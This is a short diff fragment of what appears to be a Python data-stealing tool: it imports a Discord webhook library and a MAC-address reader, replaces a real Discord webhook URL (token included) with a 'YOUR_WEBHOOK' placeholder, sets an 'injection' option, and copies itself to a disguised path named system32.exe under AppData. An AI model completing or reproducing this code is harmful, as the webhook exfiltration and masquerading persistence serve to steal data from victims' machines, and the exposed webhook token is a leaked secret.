@@ -28,8 +28,8 @@ from urllib.request import urlopen
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from getmac import get_mac_address as gma
 
-weblink = "https://discord.com/api/webhooks/999713586647670864/yud3cAPZYkOWptKzWUn-c26LDQ81jk43JUI6eViBdGQTPYj5t8igb9OGeKxl7SdbY2tp"
-injection = "YES"
+weblink = "YOUR_WEBHOOK"
+injection = "YES_NO"
 
 location = os.environ["appdata"] + "\\system32.exe"
 if not os.path.exists(location):
